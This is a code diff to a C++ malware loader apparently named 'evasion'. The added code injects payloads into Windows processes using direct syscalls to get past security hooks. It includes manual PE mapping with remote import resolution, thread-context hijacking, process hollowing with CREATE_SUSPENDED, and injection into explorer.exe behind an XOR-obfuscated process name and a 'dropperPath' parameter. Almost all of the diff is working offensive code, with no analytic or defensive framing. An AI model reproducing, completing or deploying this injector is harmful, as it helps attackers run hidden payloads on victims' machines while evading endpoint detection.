@@ -1,4 +1,6 @@
 #include "Injector.h"
+#include "Syscalls.h"
+#include "NtStructs.h"
 #include "../utils/Logger.h"
 #include "../utils/Shared.h"
 #include "../utils/Obfuscator.h"
@@ -10,40 +12,29 @@
 namespace evasion {
 
 namespace {
-    typedef LPVOID(WINAPI* pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
-    typedef BOOL(WINAPI* pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, PSIZE_T);
-    typedef BOOL(WINAPI* pVirtualProtectEx)(HANDLE, LPVOID, SIZE_T, DWORD, PDWORD);
-    typedef HANDLE(WINAPI* pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
-    typedef DWORD(WINAPI* pQueueUserAPC)(PAPCFUNC, HANDLE, ULONG_PTR);
-
     struct RELOC_ENTRY {
         WORD Offset : 12;
         WORD Type : 4;
     };
 }
 
-bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID pParam) {
-    (void)pParam;
-    auto fVirtualAllocEx = utils::GetProcAddressH<pVirtualAllocEx>("kernel32.dll", H_VirtualAllocEx);
-    auto fWriteProcessMemory = utils::GetProcAddressH<pWriteProcessMemory>("kernel32.dll", H_WriteProcessMemory);
-    auto fVirtualProtectEx = utils::GetProcAddressH<pVirtualProtectEx>("kernel32.dll", H_VirtualProtectEx);
-    auto fCreateRemoteThread = utils::GetProcAddressH<pCreateRemoteThread>("kernel32.dll", H_CreateRemoteThread);
-
-    if (!fVirtualAllocEx || !fWriteProcessMemory || !fVirtualProtectEx || !fCreateRemoteThread) {
-        LOG_ERR("MapAndInject: Failed to resolve kernel32 APIs.");
-        return false;
-    }
-
+bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload, PVOID* ppRemoteBase) {
     PBYTE pSrcData = (PBYTE)payload.data();
     PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
     PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
 
-    PBYTE pTargetBase = (PBYTE)fVirtualAllocEx(hProcess, NULL, pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    if (!pTargetBase) {
-        LOG_ERR("MapAndInject: VirtualAllocEx failed. Error: " + std::to_string(GetLastError()));
+    PVOID pTargetBase = NULL;
+    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;
+
+    // 1. Alloc RW via syscall
+    NTSTATUS status = SysNtAllocateVirtualMemory(hProcess, &pTargetBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!NT_SUCCESS(status)) {
+        LOG_ERR("MapAndInject: NtAllocateVirtualMemory fail. Status: " + utils::Shared::ToHex((unsigned long long)status));
         return false;
     }
+    LOG_INFO("MapAndInject: Allocated at " + utils::Shared::ToHex((unsigned long long)pTargetBase));
 
+    // 2. Map & Reloc locally
     std::vector<uint8_t> localMapping(pNtHeaders->OptionalHeader.SizeOfImage);
     PBYTE pLocalBase = localMapping.data();
     memcpy(pLocalBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders);
@@ -75,76 +66,145 @@ bool Injector::MapAndInject(HANDLE hProcess, const std::vector<uint8_t>& payload
         }
     }
 
-    if (!fWriteProcessMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL)) {
-        LOG_ERR("MapAndInject: WriteProcessMemory failed. Error: " + std::to_string(GetLastError()));
-        return false;
-    }
+    // 2.5 Resolve IAT
+    auto& importDir = pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+    if (importDir.Size > 0) {
+        PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)(pLocalBase + importDir.VirtualAddress);
+        while (pImportDesc->Name != 0) {
+            char* szDllName = (char*)(pLocalBase + pImportDesc->Name);
 
-    DWORD oldProtect;
-    if (!fVirtualProtectEx(hProcess, pTargetBase, pNtHeaders->OptionalHeader.SizeOfImage, PAGE_EXECUTE_READ, &oldProtect)) {
-        LOG_ERR("MapAndInject: VirtualProtectEx failed. Error: " + std::to_string(GetLastError()));
-        return false;
-    }
-
-    HANDLE hThread = fCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), NULL, 0, NULL);
-    if (!hThread) {
-        LOG_WARN("MapAndInject: CreateRemoteThread failed. Error: " + std::to_string(GetLastError()) + ". Trying APC fallback.");
-
-        // QueueUserAPC Fallback
-        auto fQueueUserAPC = utils::GetProcAddressH<pQueueUserAPC>("kernel32.dll", H_QueueUserAPC);
-        if (fQueueUserAPC) {
-            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
-            if (hSnap != INVALID_HANDLE_VALUE) {
-                THREADENTRY32 te;
-                te.dwSize = sizeof(te);
-                if (Thread32First(hSnap, &te)) {
-                    do {
-                        if (te.th32OwnerProcessID == GetProcessId(hProcess)) {
-                            HANDLE hT = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
-                            if (hT) {
-                                if (fQueueUserAPC((PAPCFUNC)(pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), hT, 0)) {
-                                    LOG_INFO("MapAndInject: Successfully queued APC to thread " + std::to_string(te.th32ThreadID));
-                                    CloseHandle(hT);
-                                    CloseHandle(hSnap);
-                                    return true;
-                                }
-                                CloseHandle(hT);
-                            }
-                        }
-                    } while (Thread32Next(hSnap, &te));
+            // Force target to load DLL
+            PVOID remoteDllName = NULL;
+            SIZE_T dllNameLen = strlen(szDllName) + 1;
+            if (NT_SUCCESS(SysNtAllocateVirtualMemory(hProcess, &remoteDllName, 0, &dllNameLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE))) {
+                SysNtWriteVirtualMemory(hProcess, remoteDllName, szDllName, dllNameLen, NULL);
+                HANDLE hThread = NULL;
+                SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), remoteDllName, 0, 0, 0, 0, NULL);
+                if (hThread) {
+                    SysNtWaitForSingleObject(hThread, FALSE, NULL);
+                    CloseHandle(hThread);
                 }
-                CloseHandle(hSnap);
+                SIZE_T freeSize = 0;
+                SysNtFreeVirtualMemory(hProcess, &remoteDllName, &freeSize, MEM_RELEASE);
             }
+
+            HMODULE hDll = GetModuleHandleA(szDllName);
+            if (!hDll) hDll = LoadLibraryA(szDllName);
+            if (hDll) {
+                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)(pLocalBase + pImportDesc->FirstThunk);
+                PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)(pLocalBase + (pImportDesc->OriginalFirstThunk ? pImportDesc->OriginalFirstThunk : pImportDesc->FirstThunk));
+                while (pThunk->u1.AddressOfData != 0) {
+                    FARPROC pFunc = NULL;
+                    if (IMAGE_SNAP_BY_ORDINAL(pOriginalThunk->u1.Ordinal)) {
+                        pFunc = GetProcAddress(hDll, (LPCSTR)IMAGE_ORDINAL(pOriginalThunk->u1.Ordinal));
+                    } else {
+                        PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)(pLocalBase + pOriginalThunk->u1.AddressOfData);
+                        pFunc = GetProcAddress(hDll, (LPCSTR)pImportByName->Name);
+                    }
+                    if (pFunc) {
+                        pThunk->u1.Function = (DWORD_PTR)pFunc;
+                    } else {
+                        LOG_ERR("MapAndInject: Failed to resolve import.");
+                    }
+                    pThunk++;
+                    pOriginalThunk++;
+                }
+            } else {
+                LOG_ERR("MapAndInject: Failed to load DLL locally: " + std::string(szDllName));
+            }
+            pImportDesc++;
         }
+    }
+
+    // 3. Write via syscall
+    if (!NT_SUCCESS(SysNtWriteVirtualMemory(hProcess, pTargetBase, pLocalBase, pNtHeaders->OptionalHeader.SizeOfImage, NULL))) {
+        LOG_ERR("MapAndInject: NtWriteVirtualMemory fail.");
         return false;
     }
 
-    LOG_INFO("MapAndInject: CreateRemoteThread success.");
-    CloseHandle(hThread);
+    // 5. Section Protections
+    PIMAGE_SECTION_HEADER pSect = IMAGE_FIRST_SECTION(pNtHeaders);
+    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
+        PVOID pSectionAddr = (PVOID)((PBYTE)pTargetBase + pSect[i].VirtualAddress);
+        SIZE_T sSize = pSect[i].Misc.VirtualSize;
+        DWORD flProtect = 0;
+
+        if (pSect[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
+            flProtect = PAGE_READWRITE;
+        } else if (pSect[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
+            flProtect = (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) ? PAGE_EXECUTE_READ : PAGE_EXECUTE;
+        } else if (pSect[i].Characteristics & IMAGE_SCN_MEM_READ) {
+            flProtect = PAGE_READONLY;
+        } else {
+            flProtect = PAGE_NOACCESS;
+        }
+
+        if (pSect[i].Characteristics & IMAGE_SCN_MEM_NOT_CACHED) flProtect |= PAGE_NOCACHE;
+
+        DWORD oldP;
+        SysNtProtectVirtualMemory(hProcess, &pSectionAddr, &sSize, flProtect, &oldP);
+    }
+
+    if (ppRemoteBase) *ppRemoteBase = pTargetBase;
+    return true;
+}
+
+bool Injector::HijackThread(HANDLE hThread, PVOID pEntryPoint) {
+    CONTEXT ctx;
+    ctx.ContextFlags = CONTEXT_CONTROL;
+
+    // Call Suspend to ensure we have control, incrementing count.
+    if (!NT_SUCCESS(SysNtSuspendThread(hThread, NULL))) return false;
+
+    if (!NT_SUCCESS(SysNtGetContextThread(hThread, &ctx))) {
+        SysNtResumeThread(hThread, NULL);
+        return false;
+    }
+
+#ifdef _M_AMD64
+    LOG_INFO("HijackThread: RIP: " + utils::Shared::ToHex((unsigned long long)ctx.Rip) + " -> " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
+    ctx.Rip = (DWORD64)pEntryPoint;
+#else
+    LOG_INFO("HijackThread: EIP: " + utils::Shared::ToHex((unsigned long long)ctx.Eip) + " -> " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
+    ctx.Eip = (DWORD)pEntryPoint;
+#endif
+
+    if (!NT_SUCCESS(SysNtSetContextThread(hThread, &ctx))) {
+        LOG_ERR("HijackThread: NtSetContextThread fail.");
+        SysNtResumeThread(hThread, NULL);
+        return false;
+    }
+
+    // Resume twice: once for our Suspend, once for the initial CREATE_SUSPENDED
+    SysNtResumeThread(hThread, NULL);
+    SysNtResumeThread(hThread, NULL);
     return true;
 }
 
 bool Injector::HollowProcess(const std::wstring& targetPath, const std::vector<uint8_t>& payload) {
-    STARTUPINFOW si;
-    PROCESS_INFORMATION pi;
-    RtlZeroMemory(&si, sizeof(si));
-    si.cb = sizeof(si);
-
+    STARTUPINFOW si; PROCESS_INFORMATION pi;
+    RtlZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
     if (!CreateProcessW(NULL, (LPWSTR)targetPath.c_str(), NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        LOG_ERR("HollowProcess: CreateProcessW failed. Error: " + std::to_string(GetLastError()));
+        LOG_ERR("HollowProcess: CreateProcess fail. Target: " + utils::ws2s(targetPath) + " Error: " + std::to_string(GetLastError()));
         return false;
     }
-
-    if (!MapAndInject(pi.hProcess, payload)) {
-        TerminateProcess(pi.hProcess, 0);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
-        return false;
+    PVOID pRemoteBase = NULL;
+    if (!MapAndInject(pi.hProcess, payload, &pRemoteBase)) {
+        TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return false;
     }
+    PBYTE pSrcData = (PBYTE)payload.data();
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
+    PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
 
-    auto fResumeThread = utils::GetProcAddressH<decltype(&ResumeThread)>("kernel32.dll", H_ResumeThread);
-    if (fResumeThread) fResumeThread(pi.hThread);
+    LOG_INFO("HollowProcess: EntryPoint at " + utils::Shared::ToHex((unsigned long long)pEntryPoint));
 
+    if (HijackThread(pi.hThread, pEntryPoint)) {
+         LOG_INFO("HollowProcess: Success.");
+    } else {
+         LOG_ERR("HollowProcess: Hijack fail.");
+         TerminateProcess(pi.hProcess, 0);
+    }
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
     return true;
@@ -154,14 +214,14 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
     DWORD pid = 0;
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot != INVALID_HANDLE_VALUE) {
-        PROCESSENTRY32W pe;
-        pe.dwSize = sizeof(pe);
+        PROCESSENTRY32W pe; pe.dwSize = sizeof(pe);
+        std::wstring targetProcess = processName;
+        for (auto& c : targetProcess) c = (wchar_t)::towlower(c);
+
         if (Process32FirstW(hSnapshot, &pe)) {
             do {
                 std::wstring currentProcess = pe.szExeFile;
-                std::transform(currentProcess.begin(), currentProcess.end(), currentProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
-                std::wstring targetProcess = processName;
-                std::transform(targetProcess.begin(), targetProcess.end(), targetProcess.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+                for (auto& c : currentProcess) c = (wchar_t)::towlower(c);
                 if (currentProcess == targetProcess) { pid = pe.th32ProcessID; break; }
             } while (Process32NextW(hSnapshot, &pe));
         }
@@ -172,29 +232,39 @@ DWORD Injector::GetProcessIdByName(const std::wstring& processName) {
 
 bool Injector::InjectIntoExplorer(const std::vector<uint8_t>& payload, const std::wstring& dropperPath) {
     (void)dropperPath;
-    std::wstring explorer = utils::DecryptW(L"\x3F\x22\x2A\x36\x35\x28\x3F\x28\x74\x3F\x22\x3F");
+    const wchar_t kExplorerEnc[] = { 'e'^0x5A, 'x'^0x5A, 'p'^0x5A, 'l'^0x5A, 'o'^0x5A, 'r'^0x5A, 'e'^0x5A, 'r'^0x5A, '.'^0x5A, 'e'^0x5A, 'x'^0x5A, 'e'^0x5A }; // explorer.exe
+    std::wstring explorer = utils::DecryptW(kExplorerEnc, 12);
     DWORD pid = GetProcessIdByName(explorer);
     if (pid == 0) {
-        LOG_ERR("InjectIntoExplorer: " + utils::ws2s(explorer) + " not found.");
+        LOG_ERR("Inject: explorer.exe not found.");
         return false;
     }
 
-    auto fOpenProcess = utils::GetProcAddressH<decltype(&OpenProcess)>("kernel32.dll", H_OpenProcess);
-    if (!fOpenProcess) return false;
-
-    // Try with minimal rights first
-    HANDLE hProcess = fOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    if (!hProcess) hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
     if (!hProcess) {
-        LOG_WARN("InjectIntoExplorer: OpenProcess with minimal rights failed. Error: " + std::to_string(GetLastError()) + ". Trying PROCESS_ALL_ACCESS.");
-        hProcess = fOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-    }
-
-    if (!hProcess) {
-        LOG_ERR("InjectIntoExplorer: Failed to open explorer process. Error: " + std::to_string(GetLastError()));
+        LOG_ERR("Inject: OpenProcess fail. PID: " + std::to_string(pid));
         return false;
     }
 
-    bool success = MapAndInject(hProcess, payload);
+    PVOID pRemoteBase = NULL;
+    bool success = MapAndInject(hProcess, payload, &pRemoteBase);
+    if (success) {
+        PBYTE pSrcData = (PBYTE)payload.data();
+        PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pSrcData;
+        PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(pSrcData + pDosHeader->e_lfanew);
+        PVOID pEntryPoint = (PVOID)((PBYTE)pRemoteBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
+
+        HANDLE hRemoteThread = NULL;
+        NTSTATUS status = SysNtCreateThreadEx(&hRemoteThread, THREAD_ALL_ACCESS, NULL, hProcess, pEntryPoint, NULL, 0, 0, 0, 0, NULL);
+        if (NT_SUCCESS(status)) {
+            LOG_INFO("Inject: NtCreateThreadEx success. TID: " + std::to_string(GetThreadId(hRemoteThread)));
+            CloseHandle(hRemoteThread);
+        } else {
+            LOG_ERR("Inject: NtCreateThreadEx fail. Status: " + utils::Shared::ToHex((unsigned long long)status));
+            success = false;
+        }
+    }
     CloseHandle(hProcess);
     return success;
 }
